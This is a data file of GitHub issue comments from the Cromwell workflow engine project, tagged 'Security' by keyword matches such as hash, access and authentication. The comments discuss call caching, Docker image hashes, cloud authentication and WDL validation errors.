submit-docker = """"""; # Pull the image using the head node, in case our workers don't have network access; # udocker pull ${docker}. sbatch \; -J ${job_name} \; -D ${cwd} \; -t ${runtime_minutes} \; 	 -p wzhcexclu06 \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""udocker run -v ${cwd}:${docker_cwd} ${docker} ${job_shell} ${docker_script}""; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }. ```. help pleas",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6920:484,hash,hash-lookup,484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6920,2,"['access', 'hash']","['access', 'hash-lookup']"
Security,I rebased and cleaned up the branch I have: https://github.com/broadinstitute/cromwell/tree/cromwell-2094. What's left is:. - Handle failure cases in `WorkflowDockerLookupActor` (see FIXMEs); - Figure out the right way to handle the tag/hash pair: Currently the runtime attribute value is overridden with the hash + we pass a `CallCacheEligible` object in the descriptor. This is probably too much. We could leave the runtime attribute as is and pass the hash only if needed and successfully retrieved ?; - Have backend report if it used the hash or the tag when a call runs. Note that this could affect call caching I think ? (We need to wait from the backend to know which was used before being able to compute the real call hash ? What if they used the tag ?); - Test it (unit ? centaur ?),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-299049726:237,hash,hash,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-299049726,5,['hash'],['hash']
Security,"I recently attempted to run a workflow with files in a separate non public google project as inputs. I submitted it using both Swagger and curl but neither gave very informative error messages. Here's the curl command and output:. ```; curl -v https://cromwell.gotc-dev.broadinstitute.org/api/workflows/v1 -F wdlSource=@PairedSingleSampleWf.wdl -F workflowInputs=@ExampleOfIncorrectProject.json; * Trying 104.197.140.34...; * Connected to cromwell.gotc-dev.broadinstitute.org (104.197.140.34) port 443 (#0); * TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384; * Server certificate: cromwell.gotc-dev.broadinstitute.org; * Server certificate: InCommon RSA Server CA; * Server certificate: USERTrust RSA Certification Authority; * Server certificate: AddTrust External CA Root; > POST /api/workflows/v1 HTTP/1.1; > Host: cromwell.gotc-dev.broadinstitute.org; > User-Agent: curl/7.43.0; > Accept: */*; > Content-Length: 38237; > Expect: 100-continue; > Content-Type: multipart/form-data; boundary=------------------------c2956aa00c34148a; > ; < HTTP/1.1 100 Continue; < HTTP/1.1 500 Internal Server Error; < Date: Fri, 18 Mar 2016 17:59:04 GMT; < Server: spray-can/1.3.2; < X-Frame-Options: SAMEORIGIN; < Access-Control-Allow-Origin: *; < Access-Control-Allow-Headers: authorization,content-type,accept,origin; < Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD; < Access-Control-Max-Age: 1728000; < Content-Type: text/plain; charset=UTF-8; < Content-Length: 69; < Connection: close; < ; * Closing connection 0; The server was not able to produce a timely response to your request.%; ```. The issue was that I was using the broad-gotc-dev project to run the workflow, but two of my input files were in broad-gp-gotc-pilot, but I had trouble figuring that out from this error message. Happy to provide the wdl and json files as well.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/589:583,certificate,certificate,583,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/589,9,"['Access', 'authoriz', 'certificate']","['Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin', 'Access-Control-Max-Age', 'authorization', 'certificate']"
Security,I recommend using the call cache diff endpoint; ```; GET ​/api​/workflows​/v1/callcaching​/diff; ```. > This endpoint returns the hash differences between 2 completed (successfully or not) calls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176:130,hash,hash,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176,1,['hash'],['hash']
Security,"I see in application.conf the following. Is this a candidate for storing securely in vault?. workflow-options {; // These workflow options will be encrypted when stored in the database; encrypted-fields: []. // AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507:73,secur,securely,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507,6,"['encrypt', 'secur']","['encrypt', 'encrypted', 'encrypted-fields', 'encryption-key', 'securely']"
Security,"I should have checked first, this actually does validate...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2567#issuecomment-324099137:48,validat,validate,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2567#issuecomment-324099137,1,['validat'],['validate']
Security,I signed up with my gmail account awhile ago but still don't have access. It is XXX@gmail.com.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510060577:66,access,access,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-510060577,1,['access'],['access']
Security,"I spoke to @droazen and we'll need a 2nd jar as well, for the GATK protected (at least for now). The repo there is `broadinstitute/gatk-protected`. He will provide a commit hash later this evening",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296316723:173,hash,hash,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296316723,1,['hash'],['hash']
Security,"I still need to get my [terminology straight](http://martinfowler.com/articles/mocksArentStubs.html), but either a mock or a stub would have probably sufficed. I mainly wanted to feel like the code was ""self-documented"" a little in the tests. Instead, I put in a detector for a `cromwell-account.conf` that when present runs an integration test against the live ""gcr.io"". TODO: I still need to clean up access token caching, but there's lots of other code that may be critiqued.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172:403,access,access,403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-161046172,1,['access'],['access']
Security,"I submitted the regular single_sample.wdl with the VIR_1923 .JSON that's; there...I guess I don't have permissions or something to access the files; that are listed. On Thu, Apr 14, 2016 at 9:01 AM, meganshand notifications@github.com; wrote:. > Not sure if this is a separate issue or not, but when @knoblett; > https://github.com/knoblett and I were submitting a workflow yesterday; > we got the exact same error message (submitted with Swagger). The issue for; > her was that there was an input that was specified to be a File type, but; > in reality it was just a String (so I'm guessing the issue was similar in; > that it couldn't find the ""file""). Unfortunately, it validated just fine,; > but we weren't able to submit it.; > ; > I'd be happy to provide the WDL and JSON files (both the broken version; > and the fixed version) but they won't attach in a github comment.; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209931581",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209935921:131,access,access,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209935921,2,"['access', 'validat']","['access', 'validated']"
Security,"I think call caching can't work on images without a hash/digest anyway, since the hash is taken into account to evaluable caching eligibility.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1262637378:52,hash,hash,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1262637378,2,['hash'],['hash']
Security,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:49,hash,hashing,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780,3,['hash'],"['hash', 'hashes', 'hashing']"
Security,"I think it has to, in order to see if the image in the cache hash matches the current pull (or other) request, here is an example: https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/library/pull.go#L55. I’m not super familiar with the code, but looks like the hash is retrieved here https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/oci/pull.go#L36 and then needs to get a manifest https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/build/oci/oci.go#L133 which I’d suspect does just that. https://github.com/containers/image/blob/175bf8b8f9ad897bdc10761e11b466d00f516a63/types/types.go#L238. If a user doesn’t have internet access, or has limited, or there is need to query the registry, might run into trouble. I just tried running an exec to a Docker uri, first of course with Internet to make sure that the images in my cache, and then I disabled my wireless. Without wireless, of course, I couldn’t run anything. This issue could be avoided if the user pulled an image first and then use that image instead of this Docker uri.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995:61,hash,hash,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995,3,"['access', 'hash']","['access', 'hash']"
Security,"I think it is acceptable for the now. There is still discussion over the; final format of the uri so the future, as usual, is a little murky. If you; want to be fancy you can resolve the uri and grab the hash. On Sun, Jun 10, 2018 at 1:32 PM Ruchi <notifications@github.com> wrote:. > @dvoet <https://github.com/dvoet> Is it acceptable for Cromwell to hash; > the dos url string itself for the purposes of call caching? Would this ever; > be different in the future?; >; > —; > You are receiving this because you were mentioned.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396066752>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABc2tWw3C-27jEOgivVBPa3jQYyBxm4sks5t7VgegaJpZM4UhdvM>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396092432:204,hash,hash,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396092432,2,['hash'],['hash']
Security,"I think that's a different request. #2652 is asking to make available the wdltool syntax validation from within cromwell. This one is asking for a new type of validation, analogous in some ways to the GATK Queue ""dry run"" feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390:89,validat,validation,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390,2,['validat'],['validation']
Security,"I think the issue is actually reversed. The call cache diff endpoint should be accessing metadata which means the missing info are the call cache hashes should be in the metadata store. We say that the metadata repository is the collection of every meaningful event that has occurred in the system and that allows downstream clients to shape that information to suit their needs. That's why all user facing ""gie me information about XYZ"" endpoints read from there. This should be the same I think.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648:79,access,accessing,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648,2,"['access', 'hash']","['accessing', 'hashes']"
Security,"I think the main problem is that in the log you expose a lot of akka internals that are not easy understand even for people who worked with akka, maybe several log levels will be good? I think by defaul all this akka-internal crap will be useless",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281770857:48,expose,expose,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281770857,1,['expose'],['expose']
Security,"I think the real underlying issue is that we don't support retrieving docker hashes from ECR yet. See this issue: https://github.com/broadinstitute/cromwell/issues/3822; In the meantime you could either [disable fetching of the hash](https://github.com/broadinstitute/cromwell/blob/fdc6fdfd2381e08c5fbf84e171eaba30ef872beb/core/src/main/resources/reference.conf#L326) (**which will disable call caching for ALL dockers with a tag**) or try using a hash in your WDL instead of a floating tag.; Note that if you use a tag and Cromwell can't fetch the corresponding hash, call caching will be disabled for that task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-434699235:77,hash,hashes,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4171#issuecomment-434699235,4,['hash'],"['hash', 'hashes']"
Security,"I think this has just bitten me as well. I am reading from a collaborator's bucket of several hundred terabytes that has underscores in the bucket name. I _think_ this is resulting in the input files being unhashable and thus disabling call-caching. The error I see (minus a real bucket path) is:. ```; [2017-05-15 17:08:12,44] [error] a05af6bd:Pre_Merge_SV.Extract_Reads:21:1: Hash error, disabling call caching for this job.; java.lang.Exception: Unable to generate input: File input_cram hash. Caused by java.lang.IllegalArgumentException: Could not find suitable filesystem among Gcs to parse gs://bucket_with_underscores/my.cram.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-302408146:378,Hash,Hash,378,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2078#issuecomment-302408146,2,"['Hash', 'hash']","['Hash', 'hash']"
Security,"I think this is ready for review, passes my basic workflows okay. Can I request the WDL Biscayne and general WDL labels for this PR?. ### Testing . Alrighty, so I did some digging and looks like similar PRs don't include tests. This doesn't mean I should blindly follow, but I can't see a great way to add a test and check its output, so I've only added validation tests (293256180ea8f6f5398866110ba8b727fd4c148e). I'm not sure if this should make it into the CHANGELOG, but I've added some text here which I'll add into the . > ### New sep function for joining an array of strings; >; > Per [OpenWDL #229](https://github.com/openwdl/wdl/pull/229), we've replaced the `sep=` string interpolator option with a new `sep` engine function, available in the WDL development (Biscayne) specification.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-626405308:354,validat,validation,354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494#issuecomment-626405308,1,['validat'],['validation']
Security,I think this looks like a permission issue. Double check that the cromwell server has AWS authentication to read and write to the bucket you listed,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434937628:90,authenticat,authentication,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434937628,1,['authenticat'],['authentication']
Security,"I think you might be right that hashing is taking a long time. There's a minimal amount of computational work that needs to be done to compute a hash, and I don't know off the top of my head which algorithm we use. I suspect we would entertain alternatives that are faster and provide an identical level of accuracy, but can't make any compromises on hash collisions that could mis-identify files and cause call caching to give wrong results. For what it's worth, most Cromwell users today use cloud storage which has APIs to quickly retrieve pre-computed hashes, which explains why more users haven't surfaced this very valid issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216:32,hash,hashing,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216,4,['hash'],"['hash', 'hashes', 'hashing']"
Security,"I tried out underscore 1.13.1 to address a [dependabot alert](https://github.com/broadinstitute/cromwell/security/dependabot) for a [CVE](https://github.com/broadinstitute/cromwell/security/dependabot/cwl/src/test/resources/cwl/underscore.js/underscore/open), but unfortunately this crashes with the default `null` value of `self` in CWL. At least for the `template` function, lodash is a drop-in replacement for underscore.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6343:105,secur,security,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6343,2,['secur'],['security']
Security,"I validated `cnv_param_sweep.wdl` and received this error:; ```; ERROR: Missing value or call: Couldn't find value or call with name 'CollectAllelicCountsNormal' in workflow (line 136):. Int model_segments_disk = ceil(size(DenoiseReadCountsTumor.denoised_copy_ratios, ""GB"")) + ceil(size(CollectAllelicCountsTumor.allelic_counts, ""GB"")) + ceil(size(CollectAllelicCountsNormal.allelic_counts, ""GB"")) + disk_pad; ```; `cnv_param_sweep.wdl` imports 3 WDLs, and the error was actually in `cnv_somatic_pair_workflow.wdl`. It would be great to know what WDL the error is in, especially if it's not the primary WDL.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3055:2,validat,validated,2,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3055,1,['validat'],['validated']
Security,I wanted to make minimal changes. This started as a vault rotation/audit ticket. But I definitely see the annoyance in having it partially removed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6331#issuecomment-832961406:67,audit,audit,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6331#issuecomment-832961406,1,['audit'],['audit']
Security,"I was asked to modify all the services so that the /api endpoint authorizes users based on their membership in ldap (filrecloud registration). Those are the four new lines added to the end of the file. The other changes are to remove things that are already set as the defaults in the openidc-proxy, so there is no reason to be specifying them. You only need to specify values that are different from the defaults. . The defaults are visible here:. https://github.com/broadinstitute/openidc-baseimage/blob/master/run.sh. and here. https://github.com/broadinstitute/dockerfiles/blob/master/openidc-proxy/override.sh. I also noticed that cromwell and thurloe are the only ones that run on port 8000, rather than port 8080, so that is why you are having to specify the PROXY_URLs as they are non-standard. All the other services in firecloud run on port 8080.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/359#issuecomment-170019993:65,authoriz,authorizes,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/359#issuecomment-170019993,1,['authoriz'],['authorizes']
Security,"I was testing some call caching behaviors. Specifically I tried to call cache on local backend with the ""hash the file path"" method which would hash a file path even though the file doesn't exist. The job would then try to find a cache hit for this path even though the file doesn't exist",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949:105,hash,hash,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949,2,['hash'],['hash']
Security,"I was trying to find a way to re-arrange the conf wrt file systems and came up with this; https://gist.github.com/Horneth/42d5656afced5795f0d2cafe3e9ef0f2. For the Firecloud case, one could have . ``` hcon; file-systems {; gcs {; authentication {; authenticationScheme = ""refresh_token""; refreshTokenAuth = {; client_id = """"; client_secret = """"; }; }; }; }; ```. instead of. ``` hcon; file-systems {; gcs {; authentication = ""default""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203071973:230,authenticat,authentication,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203071973,3,['authenticat'],"['authentication', 'authenticationScheme']"
Security,"I was writing a wdl with this line in the task definition. `Float vaf = .01`. and was getting this error when validating . `Error: Invalid WDL: ERROR: Unexpected symbol (line 28, col 16) when parsing 'e'. Expected identifier, got 01. Float vaf = .01 ^ $e = :identifier <=> :dot :identifier -> MemberAccess( lhs=$0, rhs=$2 )`. if I change it to; ; `Float vaf = 0.01`. it's fine but I think looking at the spec the first iteration should work too - https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#whitespace-strings-identifiers-constants. `$float = (([0-9]+)?\.([0-9]+)|[0-9]+\.|[0-9]+)([eE][-+]?[0-9]+)?`. Easily worked around just a little annoying. This was run on a FireCloud method so I assume its one of the more recent versions? (cromwell 34) but 🤷‍♂️",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4089:110,validat,validating,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4089,1,['validat'],['validating']
Security,I will run a test from Cromwell. In testing the GCP Batch SDK directly it will only do authentication with the docker.io prefix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020:87,authenticat,authentication,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020,1,['authenticat'],['authentication']
Security,"I would check with @Horneth - I know CC is now batching things into some maximum number of hash lookups at a time, but whether it gives up if it finds it can’t continue I’m not sure?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324166084:91,hash,hash,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324166084,1,['hash'],['hash']
Security,"I'd agree with that. I've always felt that the VA should only return a yes/no, although perhaps my issue is being overly pedantic with the name of the actor. The argument for this though was that because people (including yourself, IIRC) didn't want to receive the simple yes/no and thus replicate the parsing of the input files the VA was handing back the parsed components. Once the validation is taken out of WorkflowDescriptor's apply() method it becomes a simple case class constructed by those same values so the effect is the same.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197505173:385,validat,validation,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197505173,2,['validat'],['validation']
Security,"I'd argue that the arbitrary KV thing was one of the largest mistakes from Original WDL (i.e. what came out of the 2 weeks of us locking ourselves in a room and figuring it all out) as it destroys portability unless one adds *some* structure to it. We've doubled down on it over the years by adding what IMO should be Cromwell workflow options into the runtime block which means that a WDL can now have important control information on it which might ruin the portability of that workflow. The worst example I can think of is `backend` which is a purely Cromwell concept - what happens when that workflow goes to run on DNAnexus? What happens when `backend` is *also* a concept in another engine but it means something else? What happens when one engine interprets `cpu` to mean ""at least this much"" and another ""exactly this much""? What happens when in the former case the user gets charged more money than they thought because more memory than they needed was allocated? What happens when one engine assumes `mem` is just a number representing GB and can't parse a string w/ units?. (admittedly `mem` is a bad example as it's one of the very few things in `runtime` the spec is actually opinionated about, but you get the point). If the goal is to decouple Cromwell from WDL, the most obvious target is the `runtime` section. If people need more control over their Cromwell experience the answer is to a) provide that information in a way which doesn't destroy workflow portability of the WDL and b) expose that via Firecloud if those users need Firecloud. FWIW one of my primary goals for WDL 1.0 is a massive redo of `runtime` including removing the arbitrariness of it. If things are implementation specific they can be passed in to that engine separately, which would also help maintain the portability of the workflow itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349459099:1502,expose,expose,1502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349459099,1,['expose'],['expose']
Security,"I'd suggest titling this something like ""Consistently resolve Docker labels to hashes within a workflow"" that captures the point of this, if in fact that is the point. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-289526079:79,hash,hashes,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-289526079,1,['hash'],['hashes']
Security,"I'll largely defer to @cjllanwarne, @mcovarr, or @danbills on the specifics, but it seems that you could specify the runtime attribute you need and how to interpret it by customizing the SLURM backend in the config:. https://cromwell.readthedocs.io/en/stable/backends/SLURM/. If I'm reading the docs correctly, it might be possible to inject your `module load` command into the `--wrap` argument.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382:335,inject,inject,335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382,1,['inject'],['inject']
Security,I'm checking out WDL/Cromwell at the moment and this feature would make Cromwell definitely more interesting. It would make it much easier to run reproducible pipelines without relying on docker. (Docker is a no go on our cluster because it gives users root access.),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-352784888:258,access,access,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-352784888,1,['access'],['access']
Security,"I'm getting an error when trying to run the following WDL, which is using an `Object` type for the output of one of the tasks: https://github.com/HumanCellAtlas/pipeline-tools/blob/master/adapter_pipelines/smart_seq2/adapter.wdl#L46. This WDL previously worked in Cromwell 29. The WDL fails immediately on validation with this error:; ```; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""Some([Declaration type=Object name=prep.inputs expr=Some(prep.inputs)]) (of class scala.Some)""; }; ],; ""message"": ""Workflow input processing failed""; }; ]; ```. We're relying on objects in our HCA pipelines so it would be great if this could get fixed soon!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3060:306,validat,validation,306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3060,1,['validat'],['validation']
Security,"I'm getting the same error with this wdl: [mutect2-replicate-validation.zip](https://github.com/broadinstitute/cromwell/files/2242528/mutect2-replicate-validation.zip). And here is the dependency file: [wdl-dependencies.zip](https://github.com/broadinstitute/cromwell/files/2242529/wdl-dependencies.zip). This happens in versions 30 and up. When I run this in v29, cromwell doesn't throw an error but it hangs after completing the first task. . tsato@gsa5:novaseq: java -jar $wom validate mutect2-replicate-validation.wdl; Exception in thread ""main"" java.lang.RuntimeException: This workflow contains a cyclic dependency on m2.Mutect2.filtered_vcf; 	at wdl.draft2.model.Scope.childGraphNodesSorted(Scope.scala:53); 	at wdl.draft2.model.Scope.childGraphNodesSorted$(Scope.scala:44); 	at wdl.draft2.model.WdlWorkflow.childGraphNodesSorted$lzycompute(WdlWorkflow.scala:46); 	at wdl.draft2.model.WdlWorkflow.childGraphNodesSorted(WdlWorkflow.scala:46); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:97); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomWorkflowDefinitionMaker$.toWomWorkflowDefinition(WdlDraft2WomWorkflowDefinitionMaker.scala:14); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomWorkflowDefinitionMaker$.toWomWorkflowDefinition(WdlDraft2WomWorkflowDefinitionMaker.scala:10); 	at wom.transforms.WomWorkflowDefinitionMaker$Ops.toWomWorkflowDefinition(WomWorkflowDefinitionMaker.scala:8); 	at wom.transforms.WomWorkflowDefinitionMaker$Ops.toWomWorkflowDefinition$(WomWorkflowDefinitionMaker.scala:8); 	at wom.transforms.WomWorkflowDefinitionMaker$ops$$anon$1.toWomWorkflowDefinition(WomWorkflowDefinitionMak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:61,validat,validation,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,4,['validat'],"['validate', 'validation']"
Security,"I'm guessing that the ""people aren't around"" thing isn't going to change at 5pm on a Friday, so .... I'm thinking now that instead, perhaps the thing to do is to also have the actor know if read is on and if write is on. When the actor spins up, it ...; - If read is on, just starts determining the cache hit status w/o being asked; - If write is on, starts hashing everything; - If both are on, starts hashing everything but is checking for cache hit until a miss occurs, at which point it's just generating hashes. The actor could then receive two messages, one is ""are you a cache hit"" and the other is ""please now persist to the store"" (if you asked for cache hit status before it was done, perhaps it could send back a ""come back later"" message - that way you can avoid returning the Futures, although perhaps people like that). We know for a fact that if read is on that we'll be checking the cache, so might as well start that ASAP. If write is on, we're potentially wasting energy - e.g. if a job fails, but presumably (hopefully!) job successes are more common than job failures and we can get a jumpstart on the process.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880:358,hash,hashing,358,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880,3,['hash'],"['hashes', 'hashing']"
Security,"I'm having the same issue, is there any solution other than `docker.hash-lookup.enabled = false` because it may cause problems for call caching",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1250348746:68,hash,hash-lookup,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1250348746,1,['hash'],['hash-lookup']
